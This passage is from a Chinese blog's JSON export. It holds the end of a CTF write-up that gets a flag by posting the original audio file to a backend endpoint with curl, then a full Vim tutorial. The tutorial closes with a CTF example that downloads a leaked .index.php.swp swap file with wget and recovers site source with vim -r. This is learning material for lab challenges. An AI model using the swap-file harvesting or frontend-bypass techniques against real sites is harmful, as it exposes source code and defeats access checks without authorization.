说明flag是从后端传来，改动前端similarity值不能得到flag\n唱歌肯定不行，那么既然网站提供了原音频下载，就可以直接提交原音频\n但网页没有提供提交入口，而代码中是前端将录音文件上传到/compare-recording，那就可以直接与后端建立联系\n使用curl：\ncurl -X POST http://127.0.0.1:xxxx/compare-recording -F \u0026#34;audio=@original.wav\u0026#34; 直接得到返回的flag\n","date":"2025-05-09T01:17:52+08:00","permalink":"https://blog.928330.xyz/p/minil/","title":"MiniL"},{"content":"VIM使用方式 vim键盘图 vim操作文件基本方式 打开文件 单个文件\nvim file1 多个文件\nvim file1 file2 ... filen 该方式打开文件，显示屏默认显示第一个文件也就是 file1\n文件之间的切换 :ls \u0026ndash; 列出 VIM 打开的所有文件 :bn \u0026ndash; 显示屏上显示第n个文件 显示多个文件 左右分屏\nvim -On file1 file2 ... filen 这里的 n 是代表有几个文件需要分屏，从左至右依次显示 n 个文件\n上下分屏\nvim -on file1 file2 ... filen 跟上一个命令不同的是 -on 中的 o 是小写，这样将会上下依次显示 n 个文件\n分屏操作（ctrl+w系列） 左右分屏 Ctrl+w+s \u0026ndash; 上下分割当前打开的文件 :sp file \u0026ndash; 上下分割当前文件和新打开的 file 上下分屏 Ctrl+w+v \u0026ndash; 左右分割当前打开的文件 :vsp file \u0026ndash; 左右分割当前文件和新打开的 file 移动分屏 大写字母\nCtrl+w+H \u0026ndash; 将当前的分屏移动到左边 Ctrl+w+L \u0026ndash; 将当前的分屏移动到右边 Ctrl+w+J \u0026ndash; 将当前的分屏移动到上边 Ctrl+w+K \u0026ndash; 将当前的分屏移动到下边 在文件间切换光标 小写字母\nCtrl+w+h \u0026ndash; 将当前光标定位到左边的屏幕 Ctrl+w+l \u0026ndash; 将当前光标定位到左边的屏幕 Ctrl+w+j \u0026ndash; 将当前光标定位到左边的屏幕 Ctrl+w+k \u0026ndash; 将当前光标定位到左边的屏幕 关闭分屏 Ctrl+w+c \u0026ndash; 关闭当前的分屏(多个分屏就只关闭光标所在的分屏) Ctrl+w+q \u0026ndash; 关闭当前的分屏，如果是最后一个分屏将会退出 VIM vim五大模式 普通模式 用户刚刚启动 vi/vim，便进入了普通模式\n此状态下敲击键盘动作会被 Vim 识别为命令，而非输入字符\n普通模式移动光标 快速移动光标\n输入[数字n＋方向]，代表向某个方向移动n\nh / ← / [backspace]：向左移动光标 j / ↓：向下移动光标 k / ↑：向上移动光标 l / → / [space]：向右移动光标 在当前行上移动光标\n0 或功能键[Home] \u0026ndash; 移动到行头 ^ \u0026ndash; 移动到本行的第一个不是 blank 字符 $ 或功能键[End] \u0026ndash; 移动到行尾 g_ \u0026ndash; 移动到本行最后一个不是 blank 字符的位置 w \u0026ndash; 光标移动到下一个单词的开头 e \u0026ndash; 光标移动到下一个单词的结尾 fa \u0026ndash; 移动到本行下一个为 a 的字符处 nfa \u0026ndash; 移动到本行光标处开始的第 n 个 字符为 a 的地方 Fa \u0026ndash; 同fa一样，光标移动方向同fa相反 nFa \u0026ndash; 同 nfa 类似，光标移动方向同 nfa相反 ta \u0026ndash; 移动光标至 a 字符的前一个字符 nta \u0026ndash; 移动到第n个 a 字符的前一个字符处 Ta \u0026ndash; 同ta移动光标方向相反 nTa \u0026ndash; 同 nta 移动光标方向相反 ; \u0026amp; , \u0026ndash; 当使用 f, F, t ,T, 关键字指定字符跳转的时候，使用**；可以快速跳转到下一个指定的字符，,** 是跳到前一个指定的字符 跨行移动光标\nnG \u0026ndash; 光标定位到第 n 行的行首 gg \u0026ndash; 光标定位到第一行的行首 G \u0026ndash; 光标定位到最后一行的行首 H \u0026ndash; 光标定位到当前屏幕的第一行行首 M \u0026ndash; 光标移动到当前屏幕的中间 L \u0026ndash; 光标移动到当前屏幕的尾部 zt \u0026ndash; 把当前行移动到当前屏幕的最上方，也就是第一行 zz \u0026ndash; 把当前行移动到当前屏幕的中间 zb \u0026ndash; 把当前行移动到当前屏幕的尾部 % \u0026ndash; 匹配括号移动，包括 ( , { , [ 需要把光标先移动到括号上 * \u0026amp; # \u0026ndash; 匹配光标当前所在的单词， ***** 是下一个，# 是上一个 翻页操作\nctrl+u \u0026ndash; 向上滚动半页 ctrl+b \u0026ndash; 向上滚动一页 ctrl+d \u0026ndash; 向下滚动半页 ctrl+f \u0026ndash; 向下滚动一页 普通模式操作文本 删除\nd 是删除的意思，通常搭配一个字符 ( 删除范围 ) 实现删除功能，常用的如下：\ndw \u0026ndash; 删除一个单词 dnw \u0026ndash; 删除 n 个单词， dfa \u0026ndash; 删除光标处到下一个 a 的字符处（ fa 定位光标到 a 处 ） dnfa \u0026ndash; 删除光标处到第 n 个 a 的字符处 dd \u0026ndash; 删除一整行 ndd \u0026ndash; 删除光标处开始的 n 行 d$ \u0026ndash; 删除光标到本行的结尾 d0 \u0026ndash; 删除游标所在处到该行的最前面一个字符 dH \u0026ndash; 删除屏幕显示的第一行文本到光标所在的行 d1G \u0026ndash; 删除光标所在到第一行的所有数据 dG \u0026ndash; 删除光标所在到最后一行的所有数据 x \u0026ndash; 删除光标当前所在的字符**(delete)** X \u0026ndash; 删除光标前面的一个字符**(backspace)** nx \u0026ndash; 向后连续删除n个字符 复制\ny 是复制的意思，通常搭配一个字符（复制范围）实现复制的功能，常用的如下：\nyw \u0026ndash; 复制一个单词，还有ynw yfa \u0026ndash; 复制光标到下一个 a 的字符处,还有ynfa yy \u0026ndash; 复制一行，还有nyy y$ \u0026ndash; 复制光标到本号的结尾 yH \u0026ndash; 复制屏幕显示的第一行文本到光标所在的行 y1G \u0026ndash; 复制光标所在行到第一行的所有数据 yG \u0026ndash; 复制光标所在行到最后一行的所有数据 粘贴\np是黏贴的意思，当执行完复制或者黏贴的命令以后，VIM 会把文本寄存起来\np(小写) \u0026ndash; 在光标后开始黏贴\nP(大写) \u0026ndash; 在光标前开始粘贴\n撤销操作和恢复\nu \u0026ndash; 撤销刚才的操作 ctrl+r \u0026ndash; 恢复撤销操作 大小写转换\n~ \u0026ndash; 将光标下的字母改变大小写 3~ \u0026ndash; 将光标位置开始的3个字母改变其大小写 g~~ \u0026ndash; 改变当前行字母的大小写 gUU \u0026ndash; 将当前行的字母改成大写 guu \u0026ndash; 将当前行的字母全改成小写 3gUU \u0026ndash; 将从光标开始到下面3行字母改成大写 gUw \u0026ndash; 将光标下的单词改成大写 guw \u0026ndash; 将光标下的单词改成小写 重复操作\n. \u0026ndash; 重复上一个操作的命令 n\u0026lt;command\u0026gt; \u0026ndash; 重复某个命令 n 次，如 10p复制 10 次，10dd 删除十次 其他\nJ \u0026ndash; 将光标所在行与下一行的数据结合成同一行 c \u0026ndash; 重复删除多个数据，例如向下删除 10 行，10cj 插入模式 进入插入模式 命令 说明 i, I i \u0026ndash; 从目前光标所在处输入\nI \u0026ndash; 在目前所在行的第一个非空格符处开始输入 a, A a \u0026ndash; 从目前光标所在的下一个字符处开始输入\nA \u0026ndash; 从光标所在行的最后一个字符处开始输入 o, O o \u0026ndash; 在目前光标所在的下一行处输入新的一行\nO \u0026ndash; 在目前光标所在的上一行处输入新的一行 s，S s \u0026ndash; 删除光标所在处的字符然后插入需要录入的文本\nS \u0026ndash; 删除光标所在行，在当前行的行首开始插入需要录入的文本 cw 删除从光标处开始到该单词结束的所有字符，然后插入需要录入的文本 插入模式的命令 必须知道的：#是vim中的注释符号\n在输入模式中，可以使用以下按键：\n字符按键以及Shift组合，输入字符 ENTER，回车键，换行 BACK SPACE，退格键，删除光标前一个字符 DEL，删除键，删除光标后一个字符 方向键，在文本中移动光标 HOME/END，移动光标到行首/行尾 Page Up/Page Down，上/下翻页 Insert，切换光标为输入/替换模式，光标将变成竖线/下划线 ESC，退出输入模式，切换到命令模式 替换模式 进入替换模式 R \u0026ndash; 进入替换模式，此时新输入的文本将直接替代/覆盖已经存在的内容，点击ESC键返回常规模式\nr \u0026ndash; 进入单字符替换模式，此时新输入的字符将替代光标之下的当前字符，然后自动返回到常规模式\ngR \u0026ndash; 进入虚拟替换模式，其与替换模式最主要的区别在于，对\u0026lt;Tab\u0026gt;键和换行符的不同处理方式\ngr \u0026ndash; 进入单字符虚拟替换模式，在替换光标下的当前字符之后，将自动返回到常规模式\n虚拟替换模式 \u0026lt;Tab\u0026gt;键\n替换模式（REPLACE）下，在原有\u0026lt;Tab\u0026gt;键处输入字母\u0026rsquo;a\u0026rsquo;，将直接替代\u0026lt;Tab\u0026gt;键所占用的所有空格的位置\n虚拟替换模式（VREPLACE）下，在原有\u0026lt;Tab\u0026gt;键处输入字母\u0026rsquo;a\u0026rsquo;，将仅仅替代单个空格\n\u0026lt;NL\u0026gt;换行\n替换模式（REPLACE）下，输入\u0026lt;Enter\u0026gt;回车键将增加新行：\n虚拟替换模式（VREPLACE）下，输入\u0026lt;Enter\u0026gt;回车键将用新行替代当前行内容（即清空当前行）：\n命令模式 在命令模式下按下 :（英文冒号）就进入了底线命令模式\n有的命令要输入 / 执行\n命令模式常用命令 :w \u0026ndash; 保存文件 :q \u0026ndash; 退出 Vim 编辑器 :wq \u0026ndash; 保存文件并退出 Vim 编辑器 :q! \u0026ndash; 强制退出Vim编辑器，不保存修改 :set nu \u0026ndash; 显示行号 :set nonu \u0026ndash; 取消行号 :n \u0026ndash; 定位到第n行 :n1,n2d \u0026ndash; 删除行号n1至n2之间的内容（n1和n2都代表数字） 按 ESC 键可随时退出底线命令模式\n命令模式处理文件 :w [filename] \u0026ndash; 将编辑的数据储存成另一个文件（类似另存新档） :r [filename] \u0026ndash; 在编辑的数据中，读入另一个档案的数据，即将filenam的内容加到光标所在行后面 :n1,n2 w [filename] \u0026ndash; 将 n1 到 n2 的内容储存成 filename 命令模式搜索文本 ?{目标字符串} \u0026ndash; 向光标之上寻找一个目标字符串 /{目标字符串} \u0026ndash; 向光标之下寻找一个目标字符串 n \u0026ndash; 重复前一个搜寻的动作 N \u0026ndash; 反向进行前一个搜寻动作 :set ic \u0026ndash; 编辑器将不会区分大小写 :set noic \u0026ndash; 编辑器将区分大小写 命令模式替换文本 格式：:(作用范围)s/{目标}/{替换}(/替换的标志)\n替换的作用范围\n标志 作用 s 当前行替换 %s 全文替换 n1,n2s 指定行替换，替换n1到n2间所有行的目标，n2可以是$，代指最后一行 \u0026rsquo;\u0026lt;,\u0026rsquo;\u0026gt;s 指定区域替换 替换的标志\n标志 作用 [无] 只替换作用范围内，每行第一次出现的目标 g 一次性替换所有作用范围内所有的目标 i 大小写不敏感查找 I 大小写敏感查找 c 对作用范围内的目标逐个替换，替换前需进行确认 替换标志可以使用多个，比如/gic\n命令模式执行linux命令 :![command]\n打开终端窗口并打印执行命令的结果，不会改变当前编辑的文件的内容\n可以使用:!bash打开bash shell并执行命令\n:!date\t//执行 date 命令显示时间，执行完命令以后按下键盘上的 Enter 就会返回到文件 :r ![command]\n将shell命令command的结果插入到当前行的下一行\n:r !date\t//读取系统时间并插入到当前行的下一行 n1,n2 ![command]\n将n1至n2行范围内的内容交给命令command处理，并将处理结果替换起始行号和结束行号指定范围中的内容\n:1,4 !sort\t//将第1行到第4行的内容进行排序 可以只指定起始行\n:1 !tr [a-z] [A-Z]\t//将第1行的小写字母转为大写字母 可以用.表示当前光标所在行 (输入!!会变成:.!)\n:. !tr [a-z] [A-Z]\t//将当前行的小写转为大写 n1,n2 w ![command]\n将起始行号和结束行号所指定范围的内容作为命令command的输入，不会改变当前编辑的文件的内容\n可以使用:1 w !bash，将会把第1行的内容作为bash命令来执行并显示结果，而且不会改变当前编辑的文件的内容\n同样的 : . w !bash将当前行的内容作为bash命令来执行\n!!\n重新执行最近一次运行过的命令\n:shell / :terminal\n打开命令终端（输入exit结束并返回vim）\n使用:version命令（按q退出），查看是否包含+terminal关键字，以确认是否能使用 :terminal\n命令模式定义快捷键 基本格式\n模式 基本格式 描述 普通模式 :nmap \u0026lt;key\u0026gt; \u0026lt;command\u0026gt; 仅在普通模式下有效，定义普通模式下的快捷键 插入模式 :imap \u0026lt;key\u0026gt; \u0026lt;command\u0026gt; 用于定义插入模式下的快捷键 可视模式 :vmap \u0026lt;key\u0026gt; \u0026lt;command\u0026gt; 用于定义可视模式下的快捷键 命令行模式 :cmap \u0026lt;key\u0026gt; \u0026lt;command\u0026gt; 用于定义命令行模式下的快捷键 总体映射 :map \u0026lt;key\u0026gt; \u0026lt;command\u0026gt; 定义快捷键，适用于普通、可视、操作和选择模式，但不建议用于有冲突的情况。 总体不可递归映射 :noremap \u0026lt;key\u0026gt; \u0026lt;command\u0026gt; 类似:map，但是不会递归地扩展已经存在的映射，避免意外行为。 普通模式不可递归 :nnoremap \u0026lt;key\u0026gt; \u0026lt;command\u0026gt; 在普通模式下使用，避免递归映射 插入模式不可递归 :inoremap \u0026lt;key\u0026gt; \u0026lt;command\u0026gt; 在插入模式下使用，避免递归映射 可视模式不可递归 :vnoremap \u0026lt;key\u0026gt; \u0026lt;command\u0026gt; 在可视模式下使用，避免递归映射 缩写 :ab [缩写] [完整文本] 输入缩写后空格，自动扩展为完整文本。例如：:ab email xxxx@gmail.com 什么是\u0026lt;key\u0026gt;？\n\u0026lt;key\u0026gt; 对应的是 ^[A-Z] ， 定义快捷键时使用ctrl+v+[a-z]，使用快捷键时用对应的ctrl+[a-z]\n什么是递归映射？\n:nmap j gg :nmap Q j 如果已经做了以上映射，那么按下Q，执行的将是gg而不是j\n为了避免以上问题，应该这样定义：\n:nnoremap j gg :nnoremap Q j 几个例子\n:map ^D Ahelloworld\u0026lt;ESC\u0026gt; 在文件的光标所在行的行尾，添加 helloworld 字符串，按住组合键 ctrl + d 就会执行操作\n:map ^M I#\u0026lt;ESC\u0026gt; 在文件光标处所在行的行首插入#，按住组合键 ctrl + m 就会执行操作\n:ab email xxxx@gmail.com 输入 email+空格 会把输入的 email 自动替换成 xxxx @gmail.com\n可视化模式 进入可视化模式 可视化模式可以分为以下三种：\nv \u0026ndash; 字符可视化模式，文本选择是以字符为单位的 V \u0026ndash; 行可视化模式，文本选择是以行为单位的 ctrl-V \u0026ndash; 块可视化模式，可以选择一个矩形内的文本 在任意可视化模式下使用以上命令，将会切换到对应模式\n在任意可视化模式下使用I（大写i），将会切换到插入模式\ngv \u0026ndash; 进入上一次的可视化模式，并选中当时选中的文本**（命令模式也能用此命令）** 按 ESC 键可随时退出可视化模式\n可视化模式下移动光标 命令模式下的光标移动方法仍然适用\n进入任意可视化模式，移动光标，会从当前位置开始，以相应方式高亮选中字符\no \u0026ndash; 移动光标到已经选取的文本的结尾处或者开头处（根据现在光标所在位置确定）\n如果是块可视化模式，移动光标到对角处 O \u0026ndash; 在块可视化模式下，移动光标到同一行的结尾处或者开头处\n可视化模式下编辑 大部分命令模式对内容操作的命令都能在可视化模式下使用，比如：\nd \u0026ndash; 删除高亮文本\nD \u0026ndash; 删除一整行文本，即使只有一部分被选中了\nc \u0026ndash; 删除高亮文本并进入插入模式\ny \u0026ndash; 复制高亮文本\nY \u0026ndash; 复制一整行文本\np \u0026ndash; 黏贴复制的文本\n~ \u0026ndash; 对高亮文本进行大小写转换\n\u0026gt; / \u0026lt; \u0026ndash; 对高亮文本增加/减少缩进，幅度为一个Tab键\nr \u0026ndash; 输入单个字符，把高亮文本所有字符逐个替换为该字符\nvim宏录制 宏录制的录制操作 假设需要将文本的每一行的行首插入入一个 tab 键\n先将光标移动到第一行，在普通模式下按下 q 键（宏录制是 q 键启动的) 按一个 a （字母随意）,表示该宏注册为 a 按下 I 在行首插入一个 tab 键 按下ESC退出编辑模式 按下 j 将光标移动到下一行行首 按下 q 键完成录制操作（宏录制是 q 键结束的） 主要步骤：q(开始）-\u0026gt; a(命名) -\u0026gt; 操作 -\u0026gt; q(结束)\n宏录制的使用 @a \u0026ndash; 执行a宏录制的一系列动作，注意a是录制的操作名称 n@a \u0026ndash; 执行n次a宏 @@ \u0026ndash; 重复上一次使用的宏操作 VIM相关案例 vim缓存泄露 vim交换文件 在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容\n现在用vim打开文件1.txt，直接关闭终端，再次试图用vim打开1.txt时会出现如下提示：\n选择恢复（R），弹出如下提示：\nVim 中，当处理同一个文件发生多次异常退出时，它会依次使用不同的后缀来命名交换文件。按照你给出的模式，首次产生的交换文件名为 .index.php.swp，再次意外退出后产生 .index.php.swo，第三次产生的交换文件为 .index.php.swn。\n从第四次开始及之后的交换文件，Vim 会循环使用这三个后缀（.swp, .swo, .swn）\n例题 使用以下命令获取网站中的vim文件缓存：\nwget http://xxx/.index.php.swp -P /home //-P指定下载位置 使用vim -r恢复文件并打开:\nvim -r .index.php.swp 获取到网站源码后，进行代码审计即可\n","date":"2025-05-08T15:28:02+08:00","permalink":"https://blog.928330.xyz/p/vim%E7%BC%96%E8%BE%91%E5%99%A8%E5%AE%8C%E5%85%A8%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/","title":"Vim编辑器完全使用教程"}]